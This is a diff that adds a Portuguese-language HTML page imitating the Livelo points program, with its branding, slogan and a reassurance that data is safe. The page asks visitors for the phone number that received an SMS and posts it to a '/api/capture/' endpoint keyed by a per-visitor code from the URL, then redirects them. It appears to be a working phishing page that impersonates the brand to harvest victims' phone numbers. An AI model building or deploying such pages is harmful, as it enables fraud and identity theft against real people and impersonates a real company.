@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="theme-color" content="#df0979">
+<title>livelo</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body {
+    font-family: 'Segoe UI', -apple-system, 'Helvetica Neue', Arial, sans-serif;
+    background: #ffffff;
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    padding: 20px;
+  }
+  .icon {
+    width: 90px;
+    height: 90px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    margin: 0 auto 12px;
+  }
+  .icon img { width: 100%; height: 100%; object-fit: contain; }
+  .slogan {
+    display: inline-block;
+    color: #df0979;
+    font-size: 13px;
+    font-weight: 700;
+    letter-spacing: 3px;
+    text-transform: uppercase;
+    margin: 4px 0 26px;
+  }
+  .card {
+    width: 100%;
+    max-width: 400px;
+    text-align: center;
+  }
+  h1 {
+    font-size: 24px;
+    font-weight: 700;
+    color: #151515;
+    line-height: 1.3;
+    margin-bottom: 10px;
+  }
+  p.sub {
+    color: #767676;
+    font-size: 15px;
+    line-height: 1.5;
+    margin-bottom: 30px;
+  }
+  input {
+    width: 100%;
+    padding: 16px 20px;
+    border-radius: 500px;
+    border: 2px solid #ececec;
+    font-size: 18px;
+    text-align: center;
+    letter-spacing: 1px;
+    margin-bottom: 18px;
+    outline: none;
+    transition: border-color .2s;
+    color: #151515;
+  }
+  input:focus { border-color: #df0979; }
+  input::placeholder { color: #c5c5c5; }
+  button {
+    width: 100%;
+    padding: 16px;
+    border-radius: 500px;
+    border: none;
+    background-color: #df0979;
+    color: #ffffff;
+    font-size: 16px;
+    font-weight: 700;
+    cursor: pointer;
+    transition: opacity .2s, transform .2s;
+  }
+  button:hover { opacity: .9; transform: translateY(-1px); }
+  button:disabled { opacity: .6; cursor: wait; }
+  .lock {
+    font-size: 12px;
+    color: #767676;
+    margin-top: 20px;
+  }
+  .err-msg {
+    display: none;
+    color: #df0979;
+    font-size: 13px;
+    font-weight: 600;
+    margin-bottom: 14px;
+  }
+  .footer {
+    margin-top: 40px;
+    font-size: 12px;
+    color: #767676;
+    text-align: center;
+  }
+</style>
+</head>
+<body>
+  <div class="icon">
+    <img src="/livelo.png" alt="logo">
+  </div>
+  <div class="slogan">Pontos Viram Dinheiro</div>
+
+  <div class="card">
+    <div class="err-msg" id="err">Digite um número válido com DDD.</div>
+
+    <form id="form">
+      <h1>Quase lá! 😊</h1>
+      <p class="sub">Informe o número de telefone que recebeu o SMS para liberar seu acesso e continuar.</p>
+
+      <input type="tel" id="telefone" placeholder="Número que recebeu o SMS" maxlength="15" autofocus>
+      <button type="submit" id="btn">CONTINUAR</button>
+    </form>
+    <p class="lock">🔒 Seus dados estão seguros</p>
+  </div>
+
+  <div class="footer">Programa de pontos e vantagens</div>
+
+  <script>
+    const telInput = document.getElementById('telefone');
+    telInput.addEventListener('input', () => {
+      let v = telInput.value.replace(/\D/g, '').slice(0, 11);
+      if (v.length > 6) v = `(${v.slice(0,2)}) ${v.slice(2,7)}-${v.slice(7)}`;
+      else if (v.length > 2) v = `(${v.slice(0,2)}) ${v.slice(2)}`;
+      else if (v.length > 0) v = `(${v}`;
+      telInput.value = v;
+    });
+
+    const code = window.location.pathname.split('/')[1] || '';
+
+    document.getElementById('form').addEventListener('submit', async (e) => {
+      e.preventDefault();
+      const tel = telInput.value.replace(/\D/g, '');
+      const errEl = document.getElementById('err');
+      const btn = document.getElementById('btn');
+
+      if (tel.length < 10 || tel.length > 11) {
+        errEl.style.display = 'block';
+        return;
+      }
+      errEl.style.display = 'none';
+      btn.disabled = true;
+      btn.textContent = 'CONFIRMANDO...';
+
+      try {
+        const res = await fetch('/api/capture/' + code, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ phone: tel })
+        });
+        const data = await res.json();
+        if (res.ok && data.redirect) {
+          window.location.href = data.redirect;
+        } else {
+          btn.disabled = false;
+          btn.textContent = 'CONTINUAR';
+          errEl.textContent = data.error || 'Erro. Tente novamente.';
+          errEl.style.display = 'block';
+        }
+      } catch {
+        btn.disabled = false;
+        btn.textContent = 'CONTINUAR';
+        errEl.textContent = 'Erro de conexão. Tente novamente.';
+        errEl.style.display = 'block';
+      }
+    });
+  </script>
+</body>
+</html>
